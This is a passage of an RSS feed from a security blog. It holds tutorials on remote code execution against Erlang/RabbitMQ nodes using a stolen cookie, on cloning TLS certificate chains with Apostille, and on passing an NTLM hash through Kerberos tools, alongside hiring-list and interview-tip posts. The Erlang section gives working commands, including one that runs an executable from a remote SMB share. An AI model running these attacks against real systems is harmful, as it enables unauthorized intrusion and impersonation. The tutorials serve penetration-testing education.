&lt;p&gt;Erlang is an interesting language because it has &lt;a href=&#34;http://erlang.org/faq/introduction.html&#34;&gt;&amp;ldquo;built-in concurrency, distribution, and fault tolerance&amp;rdquo;&lt;/a&gt;. To me, this means that it does job queuing and distributed tasks right out of the gate.&lt;/p&gt;

&lt;h3 id=&#34;a-little-bit-of-history&#34;&gt;A little bit of history&lt;/h3&gt;

&lt;p&gt;I first started digging into Erlang again from an attackers point of view at &lt;a href=&#34;https://www.bsidesphilly.org/&#34;&gt;BSides Philadelphia&lt;/a&gt; 2016, where I talked about SolarWinds ORION. I was in the audience making last minute changes to my slides when I happened upon an &amp;ldquo;erlang-node&amp;rdquo; port (25672) listening. You can watch the video here (I&amp;rsquo;ve jumped ahead to the part about the Erlang port):&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/VXUPyod6vqw?start=240&#34; frameborder=&#34;0&#34; allow=&#34;autoplay; encrypted-media&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;After I gave that talk, I asked around &lt;a href=&#34;http://novahackers.blogspot.com/p/how-to-join-and-rules.html&#34;&gt;NoVA Hackers&lt;/a&gt;. Luckily one such individual did, and that&amp;rsquo;s why I love what NoVA Hackers has grown into, but this post isn&amp;rsquo;t about that.&lt;/p&gt;

&lt;p&gt;With a little bit of back and forth with what I was trying to accomplish, we worked out the needed requirements for code execution.&lt;/p&gt;

&lt;h3 id=&#34;erlnag-nodes&#34;&gt;Erlnag Nodes&lt;/h3&gt;

&lt;p&gt;Erlang uses &amp;ldquo;Nodes&amp;rdquo; to execution code. As far as I can tell (and I&amp;rsquo;ll probably be corrected) but you must run a node to execute any Erlang code, so everything written in Erlang (RabbitMQ, CouchDB, etc.) must be running a node. Erlang nodes are identified by their hostname. For my SolarWinds box, it&amp;rsquo;s &lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt;. This is the most straightforward piece of information to acquire for the authenticated RCE.&lt;/p&gt;

&lt;h3 id=&#34;the-cookie&#34;&gt;The Cookie&lt;/h3&gt;

&lt;p&gt;The Erlang cookie &lt;strong&gt;SHOULD&lt;/strong&gt; be the hardest to acquire. It&amp;rsquo;s essentially the shared secret password between nodes, and just a simple string. This cookie exists even if only a single node is spun up (such is the case for SolarWinds). It is most commonly stored in a file called &lt;code&gt;.erlang.cookie&lt;/code&gt; with nothing in the file other than the string. You can find it in home directories, userprofiles, project files and such. On Linux, it begining with the &lt;code&gt;.&lt;/code&gt; means that it&amp;rsquo;s automatically a &amp;ldquo;hidden&amp;rdquo; file, but on Windows it doesn&amp;rsquo;t mean much ;). RabbitMQ documents well where the key is located:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.rabbitmq.com/clustering.html#erlang-cookie&#34;&gt;https://www.rabbitmq.com/clustering.html#erlang-cookie&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example &lt;code&gt;.erlang.cookie&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rabbit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One Windows for Solar Winds it can be found in &lt;strong&gt;Program Data&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_cookie.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;the-cluster-name&#34;&gt;The Cluster Name&lt;/h3&gt;

&lt;p&gt;The cluster name is needed to join the cluster but this is more of a guessing game. However, luckily these are regularly named based on the service being offered. RabbitMQ in particular almost always has a cluster name of &lt;code&gt;rabbit&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;the-node-port&#34;&gt;The Node Port&lt;/h3&gt;

&lt;p&gt;This is actually pretty interesting that I haven&amp;rsquo;t dived into completely yet, but the port isn&amp;rsquo;t specified or default. There is some sort of discovery process so no matter the port the nodes are running on Erlang is able t find it. In the case of SolarWinds Orion&amp;rsquo;s RabbitMQ, its &lt;code&gt;25672&lt;/code&gt; but I&amp;rsquo;ve seen erlang nodes on a number of other ports, usually particular to the project it&amp;rsquo;s being run for.&lt;/p&gt;

&lt;h3 id=&#34;remote-code-execution&#34;&gt;Remote Code Execution&lt;/h3&gt;

&lt;p&gt;A simple &lt;code&gt;apt install erlang&lt;/code&gt; gets you ready for exectuion. Once installed you need to put your &lt;code&gt;.erlang.cookie&lt;/code&gt; file in your home directory &lt;code&gt;~/&lt;/code&gt;. You also need to resolve the hostname (Node name) you wil be connecting to.&lt;/p&gt;

&lt;p&gt;Then it&amp;rsquo;s just running a couple commands:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;test&lt;/code&gt; is the node name you&amp;rsquo;ll be calling your attack box when connecting to the cluster&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rabbit&lt;/code&gt; is the cluster name being connected to&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WIN-PM0ID6F0AHN&lt;/code&gt; is the hostname I&amp;rsquo;m connecting to the cluster via&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Start up Erlang with &lt;code&gt;erl -sname test&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# erl -sname test
Erlang/OTP 18 [erts-7.3.1.2] [source] [64-bit] [async-threads:10] [kernel-poll:false]

Eshell V7.3.1.2  (abort with ^G)
(test@kali)1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Connecting to the cluster (the period on the end of the commands important terminators)&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(test@kali)1&amp;gt; net_kernel:connect(&#39;rabbit@WIN-PM0ID6F0AHN&#39;).
true
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you get a &lt;code&gt;true&lt;/code&gt; that means the connection was successful.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Code exeuction (starting calc of course)&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(test@kali)2&amp;gt; erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;calc.exe&amp;quot;]).
&amp;lt;6867.30570.461&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And so, like any good code execution attack, &lt;code&gt;calc.exe&lt;/code&gt; is executed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_sw_calc.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;On Windows of course you can even do SMB shares:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;erlang:spawn(&#39;rabbit@WIN-PM0ID6F0AHN&#39;,os,cmd,[&amp;quot;\\\\192.168.80.69\\share\\runme.exe&amp;quot;]).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Exiting the &lt;strong&gt;Erlang Shell&lt;/strong&gt; is done with the init::stop function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(test@kali)3&amp;gt; init:stop().
ok
(test@kali)4&amp;gt; root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;warning-by-running-this-code-execution-method-you-are-running-a-node-as-well-as-as-long-as-you-have-the-connection-open-you-can-be-exploited-the-same-way-you-are-exploiting-the-remote-host&#34;&gt;Warning: By running this code execution method you are running a node as well, as as long as you have the connection open, you can be exploited the same way you are exploiting the remote host.&lt;/h4&gt;

&lt;h3 id=&#34;the-bad-and-the-worse&#34;&gt;The Bad, and the worse&amp;hellip;&lt;/h3&gt;

&lt;p&gt;In many Docker instances the &lt;code&gt;.erlang.cookie&lt;/code&gt; file is statically assigned and easy to find in the code. This is incredibly dangerous to have a statically assigned Erlang cookie for anyone who uses your Docker image, however because Docker doesn&amp;rsquo;t automatically expose ports from the docker instance, this is actually a better scenario in many cases than running the erlang project without containers.&lt;/p&gt;

&lt;p&gt;This is not always the case and just like &lt;a href=&#34;https://www.itnews.com.au/news/passwords-ssh-keys-exposed-on-github-330152&#34;&gt;private keys on github&lt;/a&gt;, really easy to find:&lt;/p&gt;

&lt;p&gt;Searching for &lt;code&gt;.erlang.cookie&lt;/code&gt; on Github:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/erlang_github.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;the-ugly&#34;&gt;The Ugly&lt;/h3&gt;

&lt;p&gt;Changing the Erlang Cookie is a pain, and usually very deep in the project or setup, so once you have the file, you have future proof code execution.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 KiwiCon Hiring List</title>
      <link>https://malicious.link/post/2018/2018-kiwicon-hiring-list/</link>
      <pubDate>Sun, 09 Sep 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2018-kiwicon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://kiwicon.org/&#34;&gt;Kiwicon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/hfftscOGBWp14Ust1&#34;&gt;https://goo.gl/forms/hfftscOGBWp14Ust1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1q_qBbtBkbNNEmOoLkayW4GoMRXbMGIC3JyK0g9ML9fw/&#34;&gt;https://docs.google.com/spreadsheets/d/1q_qBbtBkbNNEmOoLkayW4GoMRXbMGIC3JyK0g9ML9fw/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vSrLjmBB_5vuyY8yLBw6YG2j4Bw5QYnFI43MdM4TI6XeFNsRsUYGktdxsb1p-Spk_HrNKva-m7ThA8f/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>2018 DerbyCon Hiring List</title>
      <link>https://malicious.link/post/2018/2018-derbycon-hiring-list/</link>
      <pubDate>Sat, 01 Sep 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2018-derbycon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://www.derbycon.com/&#34;&gt;DerbyCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/K6kfOY5dHH6lcQm63&#34;&gt;https://goo.gl/forms/K6kfOY5dHH6lcQm63&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/11J2oqGndmBB7mFoc_JfpMGv6S41UZRcTi7NByjavHBU/&#34;&gt;https://docs.google.com/spreadsheets/d/11J2oqGndmBB7mFoc_JfpMGv6S41UZRcTi7NByjavHBU/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vS3_6HGQEgYQTByN3GA2BZOhCFTwjMywdlNdu6IUXIDKdgmAVMT5sf5sep929lUtD0qgo6XupfkrF0B/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Stealing Certificates with Apostille</title>
      <link>https://malicious.link/post/2018/stealing-certificates-with-apostille/</link>
      <pubDate>Sun, 26 Aug 2018 08:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/stealing-certificates-with-apostille/</guid>
      <description>&lt;p&gt;At Def Con 26, &lt;a href=&#34;https://twitter.com/singe&#34;&gt;@singe&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/_cablethief&#34;&gt;@_cablethief&lt;/a&gt; gave a talk on enterprise wireless attacks. When it&amp;rsquo;s video is released you should check it out.&lt;/p&gt;

&lt;p&gt;During that talk, they quickly touched on a tool written by &lt;a href=&#34;https://twitter.com/rogandawes&#34;&gt;Rogan Dawes&lt;/a&gt; another &lt;a href=&#34;https://twitter.com/sensepost&#34;&gt;@Sensepost&lt;/a&gt;-er&amp;rsquo;s tool called &amp;ldquo;&lt;a href=&#34;https://github.com/sensepost/apostille&#34;&gt;Apostille&lt;/a&gt;&amp;rdquo;. It is esentially a certificate stealing (cloning? faking? doppelganger-ing?) tool. However, that over simplifies what it does.&lt;/p&gt;

&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;To be more accurate, Apostille generates a clone of the certificate chain, identical in as many details as possible, apart from the actual key values. One thing this could be useful for is bypassing naive cert pinning if the validation is based on details of the signing certs.&lt;/p&gt;&amp;mdash; Rogan Dawes (@RoganDawes) &lt;a href=&#34;https://twitter.com/RoganDawes/status/1033769690609463297?ref_src=twsrc%5Etfw&#34;&gt;August 26, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;


&lt;p&gt;Copying a certificate&amp;rsquo;s common name, email, or other fields that are inputted during creation is a relatively easy way to copy certificates, and they can look relatively good at first glance. However, this simple copy leads to many tell-tail signs that it&amp;rsquo;s fake. For instance lets say I create a certificate like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mycert.pem -out mycert.pem
Generating a 2048 bit RSA private key
.................................................................................................................+++
...+++
writing new private key to &#39;mycert.pem&#39;
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &#39;.&#39;, the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:Mountain View
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Google LLC
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:*.google.com
Email Address []:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If I host it out, here are the results side by side with Google.com:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-01.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;Vaild From&lt;/code&gt;, the &lt;code&gt;Issued By&lt;/code&gt;, and most of the other certificate information helps this certificate to stand out as fraudulent. Also, doing this by hand is a PITA.&lt;/p&gt;

&lt;p&gt;Enter &lt;strong&gt;Apostille&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s pretty straight forward to get it going, but you do need both Java&amp;rsquo;s JDK and Maven to compile it first:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~# apt install -y maven default-jdk git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(I&amp;rsquo;m doing this on a fresh box so it needed git as well)&lt;/p&gt;

&lt;p&gt;Step 2, &lt;code&gt;git clone&lt;/code&gt; the repo, and compile with Maven:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~# git clone https://github.com/sensepost/apostille
Cloning into &#39;apostille&#39;...
remote: Counting objects: 48, done.
remote: Total 48 (delta 0), reused 0 (delta 0), pack-reused 48
Unpacking objects: 100% (48/48), done.
root@apostille-post:~# cd apostille/
root@apostille-post:~/apostille# mvn package
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step 3, Clone your first certificate:
&lt;code&gt;java -jar target/apostille-1.0-SNAPSHOT.jar google.com:443 tempkeystore.jks ASDqwe123 ASDqwe123&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;google.com:443&lt;/code&gt; is the endpoint that will serve a certificate chain back, this isn&amp;rsquo;t regulated to only HTTPS, but any TLS endpoint.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tempkeystore.jks&lt;/code&gt; is the Java Keystore file that we will putting the certificate chain into.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ASDqwe123&lt;/code&gt; is the &lt;code&gt;kspassword&lt;/code&gt; and then the &lt;code&gt;keypassword&lt;/code&gt; (Keystore and certificate password) - I just made them the same as this is an example and I won&amp;rsquo;t be using the keystore for anything but to export the certificates later.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In order to get the certificates out of the keystore and into a PEM format that I can use for testing, I used the following:&lt;/p&gt;

&lt;p&gt;Source: &lt;a href=&#34;https://www.calazan.com/how-to-convert-a-java-keystore-jks-to-pem-format/&#34;&gt;https://www.calazan.com/how-to-convert-a-java-keystore-jks-to-pem-format/&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~/apostille# keytool -importkeystore -srckeystore tempkeystore.jks -destkeystore myapp.p12 -srcalias *.google.com -srcstoretype jks -deststoretype pkcs12
Importing keystore tempkeystore.jks to myapp.p12...Enter destination keystore password: ASDqwe123
Re-enter new password: ASDqwe123
Enter source keystore password: ASDqwe123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(The passwords will not show up, but I put them in there so you can see what I&amp;rsquo;m inputting. Again I chose a simple password because I&amp;rsquo;m converting it one more time)&lt;/p&gt;

&lt;p&gt;Then finally to a PEM like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~/apostille# openssl pkcs12 -in myapp.p12 -out myapp.pem
Enter Import Password: ASDqwe123
Enter PEM pass phrase: WugWZ3!F3hD#8P!f
Verifying - Enter PEM pass phrase: WugWZ3!F3hD#8P!f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To test out how it looks I&amp;rsquo;ll reference &lt;a href=&#34;http://attackerkb.com/Web/Quick%20Web%20Servers&#34;&gt;AKB&amp;rsquo;s Quick Web Servers list&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@apostille-post:~/apostille# openssl s_server -cert myapp.pem -accept 443 -WWW
Enter pass phrase for myapp.pem: WugWZ3!F3hD#8P!f
Using default temp DH parameters
ACCEPT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the result is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-02.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-03.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2018/stealing-certs-04.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;A much more believable certificate, even to the discerning eye.&lt;/p&gt;

&lt;p&gt;Again, thanks to &lt;a href=&#34;https://twitter.com/rogandawes&#34;&gt;@RoganDawes&lt;/a&gt; for this amazing tool.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 BH/DC/BSidesLV Hiring List</title>
      <link>https://malicious.link/post/2018/2018-bhdcbslv-hiring-list/</link>
      <pubDate>Fri, 27 Jul 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2018-bhdcbslv-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://www.blackhat.com/us-18/&#34;&gt;BlackHat&lt;/a&gt;, &lt;a href=&#34;https://defcon.org/&#34;&gt;DEF CON&lt;/a&gt;, &lt;a href=&#34;https://www.bsideslv.org/&#34;&gt;BSidesLV&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/dIjQHTPLk7ZYyv5D2&#34;&gt;https://goo.gl/forms/dIjQHTPLk7ZYyv5D2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/13szhdt08HqmvV1pxZbrBzoYv8pe0vpvT-z9w-XTcEKw/&#34;&gt;https://docs.google.com/spreadsheets/d/13szhdt08HqmvV1pxZbrBzoYv8pe0vpvT-z9w-XTcEKw/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vT-mq7vxGxVXOyO9IoBArmAAY7qA0851mq1S4wPG_98ZMWPVQHP9d8jTuFyJU_Lj4yU3Rq6YIg6ntaR/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Pass the Hash with Kerberos</title>
      <link>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</link>
      <pubDate>Tue, 24 Jul 2018 08:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/pass-the-hash-with-kerberos/</guid>
      <description>&lt;p&gt;This blog post may be of limited use, most of the time, when you have an NTLM hash, you also have the tools to use it. But, if you find yourself in a situation where you don&amp;rsquo;t have the tools and do happen to have kerberos tools, you can pass the hash with it.&lt;/p&gt;

&lt;p&gt;Lets say with have the NTLM hash for the user &lt;code&gt;uberuser&lt;/code&gt; and the hash is &lt;code&gt;88e4d9fabaecf3dec18dd80905521b29&lt;/code&gt;. The first step to do so is to create a keytab file using &lt;code&gt;ktutil&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# ktutil
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At the &lt;code&gt;ktutil&lt;/code&gt; prompt, type in the &amp;ldquo;add entry&amp;rdquo; (&lt;code&gt;addent&lt;/code&gt;) command with the &amp;ldquo;principals&amp;rdquo; (&lt;code&gt;-p&lt;/code&gt;) flag. Specify the user and an all uppercase version of the FQDN. Then the &amp;ldquo;KVNO&amp;rdquo; (&lt;code&gt;-k 1&lt;/code&gt;), which is the key number. Finally the encryption type, which is &lt;code&gt;rc4-hmac&lt;/code&gt; for NTLM hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After you hit enter you&amp;rsquo;ll get prompted for the rc4-hmac (NTLM) hash:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we write the keytab file to disk and exit &lt;code&gt;ktutil&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ktutil: wkt /tmp/a.keytab
ktutil: exit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last step before we can use our authentication is to create a kerberos ticket using our keytab file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM
Using default cache: /tmp/krb5cc_0
Using principal: uberuser@CORP.SOMEWHATREALNEWS.COM
Using keytab: /tmp/a.keytab
Authenticated to Kerberos v5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validate it with &lt;code&gt;klist&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: uberuser@CORP.SOMEWHATREALNEWS.COM

Valid starting       Expires              Service principal
07/22/2018 21:38:43  07/23/2018 07:38:43  krbtgt/CORP.SOMEWHATREALNEWS.COM@CORP.SOMEWHATREALNEWS.COM
	renew until 07/23/2018 21:38:40

&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Getting Hired: A Few Tips</title>
      <link>https://malicious.link/post/2018/getting-hired-a-few-tips/</link>
      <pubDate>Sun, 22 Jul 2018 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/getting-hired-a-few-tips/</guid>
      <description>&lt;p&gt;In early August of 2017 &lt;a href=&#34;https://twitter.com/mubix/status/892760622563241988&#34;&gt;I posted a few tips to Twitter regarding interviewing and getting hired in general&lt;/a&gt;. I&amp;rsquo; pasting them here to preserve them. I only had 140 characters to make these, and I think there is a lot more you can do, but 30 tips is a good start.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Don&amp;rsquo;t post obvious CFAA violations to social media&lt;/li&gt;
&lt;li&gt;If you go in without a job and a chip on your shoulder, you&amp;rsquo;ll leave the same way&lt;/li&gt;
&lt;li&gt;If you don&amp;rsquo;t ask follow up questions, I won&amp;rsquo;t have any either, like &amp;ldquo;would you like the job?&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Exaggerating on your resume isn&amp;rsquo;t a good idea, but if you do, be ready to explain it&lt;/li&gt;
&lt;li&gt;The company is going to look at your social media. Privacy concerns? Don&amp;rsquo;t post publicly. Don&amp;rsquo;t get sassy in the interview about it.&lt;/li&gt;
&lt;li&gt;Dropping a vuln in the company during the interview is a stupid move. (Personal experience)&lt;/li&gt;
&lt;li&gt;Your attire matters. If you look like you just got out of bed, I&amp;rsquo;ll probably just let you go back to it.&lt;/li&gt;
&lt;li&gt;Being honest about not knowing something is great. Emailing after the interview that you researched it and now understand it is AWESOME!&lt;/li&gt;
&lt;li&gt;It is always ok to ask why you didn&amp;rsquo;t get the job and where you can improve. Unfortunately straight answers aren&amp;rsquo;t always possible.&lt;/li&gt;
&lt;li&gt;Like college, trying many types of Infosec jobs will make you better at all of them.&lt;/li&gt;
&lt;li&gt;Stay humble.&lt;/li&gt;
&lt;li&gt;If you were referred by a friend that works there already, respect the fact that you are representing them as well.&lt;/li&gt;
&lt;li&gt;Making money is better than not. If you think you are too good to be a Walmart greeter, you are probably too good for this job too.&lt;/li&gt;
&lt;li&gt;Try not to take it personally if you don&amp;rsquo;t get the job today. You might be able to apply later. You won&amp;rsquo;t if you lash out.&lt;/li&gt;
&lt;li&gt;Contributions to open source projects isn&amp;rsquo;t required, but is a good way to demonstrate values, skills, and mindset.&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t whine and complain during an interview. It&amp;rsquo;s ok to point out deficiencies, or answer why you left your last job but keep it brief.&lt;/li&gt;
&lt;li&gt;Set expectations and ask questions like: Can I ping you if I haven&amp;rsquo;t heard from you in a week? What should I wear to the interview&lt;/li&gt;
&lt;li&gt;Minimal self deprecation is fine, but if you spend the whole interview talking about how much you suck, I&amp;rsquo;ll believe it.&lt;/li&gt;
&lt;li&gt;Include &amp;ldquo;Selected Accomplishments&amp;rdquo; part in your resume. 2-4 things that you are particularly proud of, doesn&amp;rsquo;t have to be done at work.&lt;/li&gt;
&lt;li&gt;The question &amp;ldquo;where do you want to be / doing 2/4/10 years&amp;rdquo; is a standard question. &amp;ldquo;I don&amp;rsquo;t know&amp;rdquo; is ok, but a prepared answer is better.&lt;/li&gt;
&lt;li&gt;Sarcasm is taken differently by everyone. Might go over good or bad. If it&amp;rsquo;s how you deal w/ nervousness, practice interviewing more.&lt;/li&gt;
&lt;li&gt;Practice interviewing. Find someone that will give you candid feedback and interview for positions you want with them.&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t take an interview call in a crowded or loud place. Rescheduling is totally ok as long as it&amp;rsquo;s done with more than 24 hours notice.&lt;/li&gt;
&lt;li&gt;The saying &amp;ldquo;It&amp;rsquo;s not what, but who you know&amp;rdquo; is unfortunately true a lot of times. But it is because &lt;em&gt;who&lt;/em&gt; you know can vouch for &lt;em&gt;what&lt;/em&gt; you know.&lt;/li&gt;
&lt;li&gt;Just because someone is a manager doesn&amp;rsquo;t mean they can&amp;rsquo;t run circles around you technically and are just acting dumb. (Personal experience)&lt;/li&gt;
&lt;li&gt;If your LinkedIn profile does not match up with your resume, you will probably be asked about it. (i.e. degree, certs, jobs mismatch)&lt;/li&gt;
&lt;li&gt;Ask about travel and feel free to ask to talk to potential co-workers about travel and other topics to get the ground truth.&lt;/li&gt;
&lt;li&gt;Offer letters and nearly all hiring / new-hire documents are contracts. You can &amp;ldquo;X&amp;rdquo; out anything you don&amp;rsquo;t agree with. $employer will have to approve the change.&lt;/li&gt;
&lt;li&gt;When asked to list one or more strengths or weaknesses: Strengths: stay humble, Weaknesses: share how you are working to get better&lt;/li&gt;
&lt;li&gt;Everything on the Internet is suspect. Trust but verify right? Learn things for yourself. Blog, tweet, share how/what you learned. YMMV.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Have some yourself? I would love to add it! Please just tweet a reply via Twitter to me and I&amp;rsquo;ll get it added. Thanks!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>A Few Changes</title>
      <link>https://malicious.link/post/2018/a-few-changes/</link>
